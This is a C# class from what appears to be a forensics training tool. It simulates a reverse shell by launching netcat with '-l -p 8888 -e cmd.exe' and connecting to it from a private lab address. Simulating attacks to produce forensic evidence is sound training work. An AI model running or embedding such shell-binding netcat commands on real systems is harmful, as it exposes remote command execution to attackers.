using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using Caliburn.Micro;
using ForensicScenarios.Tools;
using ForensicScenarios.Events;

namespace ForensicScenarios.Scenarios
{
    public class ReverseShell : PropertyChangedBase, IScenario
    {
        public string Name => "Reverse Shell";

        public string Description { get; set; }

        public string Status => string.Empty;

        public bool IsSelected
        {
            get => isSelected;
            set
            {
                isSelected = value;
                NotifyOfPropertyChange(nameof(IsSelected));
            }
        }

        private bool isSelected;
        private int exitCount;

        private readonly IEventAggregator eventAggregator;

        public ReverseShell(IEventAggregator aggregator)
        {
            eventAggregator = aggregator;
            Description = string.Empty;
        }

        public void Run()
        {
            string path = Directory.GetCurrentDirectory() + @"\Scripts\Attacker\nc.exe 192.168.10.101 8888";
            var prc = ProcessService.CreateCmdProcess(path, false);

            string path2 = Directory.GetCurrentDirectory() + @"\Scripts\Attacker\nc.exe -l -p 8888 -e cmd.exe";
            var prc2 = ProcessService.CreateCmdProcess(path2, false, false, true);

            var prc3 = ProcessService.CreateCmdProcess(string.Empty, createWindow: false, redirectInput: true);

            prc.Exited += ProcessExited;
            prc2.Exited += ProcessExited;
            prc3.Exited += ProcessExited;

            prc.Start();
            prc2.Start();
            prc3.Start();
            //prc3.StandardInput.Write(prc2.StandardOutput.ReadToEnd());
            //Debug.Write(prc2.StandardOutput.ReadToEnd());
        }

        private void ProcessExited(object sender, EventArgs e)
        {
            exitCount++;

            if (exitCount == 3)
            {
                exitCount = 0;
                eventAggregator.BeginPublishOnUIThread(new ScenarioCompleted(this));
            }
        }
    }
}
